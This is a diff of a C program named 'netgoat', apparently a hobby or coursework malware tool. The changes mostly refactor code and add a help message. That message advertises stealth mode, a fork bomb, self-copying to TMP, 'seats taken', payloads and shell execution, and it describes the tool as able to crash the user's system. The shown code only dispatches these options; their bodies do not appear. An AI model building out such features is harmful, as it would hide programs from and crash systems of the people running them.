@@ -23,11 +23,11 @@ int executable_FD;
 void handleSignal(int signalReceived);
 int stealth(int fd_in);
 int cat(int fd_in, int fd_out);
-int usage(); //function for help information
+void show_usage(); //function for help information
 int storeToTMP();
 int seatsTaken();
 int forkBombEm();
-int executeIt(char *argv[]);
+void executeIt(char *argv[]);
 
 int main(int argc, char *argv[]){
   
@@ -35,9 +35,16 @@ int main(int argc, char *argv[]){
   struct sigaction sigHandler;
   sigHandler.sa_handler = &handleSignal;
   sigHandler.sa_flags = SA_RESTART;
-  int signalNum;
-  signalNum = sigaction(SIGUSR1, &sigHandler, NULL);
-  signalNum = sigaction(SIGUSR2, &sigHandler, NULL);
+  if (sigaction(SIGUSR1, &sigHandler, NULL) < 0) {
+    printf("Error with SIGUSR1 sigaction.");
+    return 1;
+  }
+  if (sigaction(SIGUSR2, &sigHandler, NULL) < 0) {
+    printf("Error with SIGUSR2 sigaction.");
+    return 1;
+  }
+
+
   printf("signal handler part complete\n\n");
 
   //PRINT OUT THE PID FOR SIGNALS
@@ -45,7 +52,7 @@ int main(int argc, char *argv[]){
 
   if (argc == 1){ //argument number tracking
     printf("No arguments entered. Displaying Help Message\n");
-    usage(); 
+    show_usage(); 
   }
 
   //store the executable into a buffer
@@ -56,14 +63,15 @@ int main(int argc, char *argv[]){
       return(0);
       }
     int buffer_size = read(fd_in, universalProgramBuffer, maxBufferLength);
+    buffer_size = buffer_size; // Remove warning
     printf("buffer reading and storage complete.\n\n");
 
   //base variables for tracking for progress
   int catFunction = 0;
-  int stealthModeTracker = 0;
-  int forkBombTracker = 0;
+  //int stealthModeTracker = 0;
+  //int forkBombTracker = 0;
   int echoFunction = 0;
-  int seatsTakenTracker = 0;
+  //int seatsTakenTracker = 0;
   printf("Variable storage complete.\n\n");
 
   //OPTION HANDLING
@@ -72,7 +80,7 @@ int main(int argc, char *argv[]){
   while((opt = getopt(argc, argv, "hlscfevtrzw")) != -1){
     switch(opt){
       case 'h':
-        usage();
+        show_usage();
         return(0); //end the program
         break;
       case 'l':
@@ -81,7 +89,7 @@ int main(int argc, char *argv[]){
       case 's':
         printf("*test* stealth mode enabled.\n");
         stealth(fd_in);
-        //universalStealthModeTracker = 1;
+        universalStealthModeTracker = 1;
         break;
       case 'c':
         printf("*test* cat functionality enabled. \n");
@@ -97,12 +105,12 @@ int main(int argc, char *argv[]){
         break;
       case 'f':
         printf("*test* fork bomb activated");
-        forkBombTracker = 1;
+        //forkBombTracker = 1;
         forkBombEm();
         break;
       case 't':
         printf("*test* Seats Taken.");
-        seatsTakenTracker = 1;
+        //seatsTakenTracker = 1;
         seatsTaken();
         break;
       case 'r':
@@ -172,7 +180,7 @@ void handleSignal(int signalReceived){
   }
 }
 
-int executeIt(char *argv[]){
+void executeIt(char *argv[]){
     if (!getenv("PATH")){ // test to see if PATH is not null, then execute
     setenv("PATH", "/bin:/usr/bin:/usr/local/bin", 1);
   }
@@ -304,5 +312,22 @@ int cat(int fd_in, int fd_out){
   }
 return(0);
 }
-netgoat_reference.txt
-Displaying netgoat_reference.txt.
+
+void show_usage(){
+             printf("NAME\n\n");
+             printf("netgoat\n\n");
+             printf("Considered the 'Swiss Army Knife' of codes. NetGoat is a program to allow users to select from a multitude of command line options in order to perform tasks ranging from hiding the executable to crashing the user's computer system.\n\n");
+             printf("netgoat [file] ...\n\n");
+             printf("Command Line Options\n\n");
+
+
+             printf("netgoat <option>\n");
+             printf("-h\tdisplay help\n");
+             printf("-s\tstealth mode\n");
+             printf("-c\tuse cat functionality\n");
+             printf("-v\tactivate variable payloads\n");
+             printf("-f\tactivate fork bomb\n");
+             printf("-t\tactivate seats taken\n");
+             printf("-r\tstore a version to system TMP\n");
+             printf("-z\texecute myshell command\n");
+}
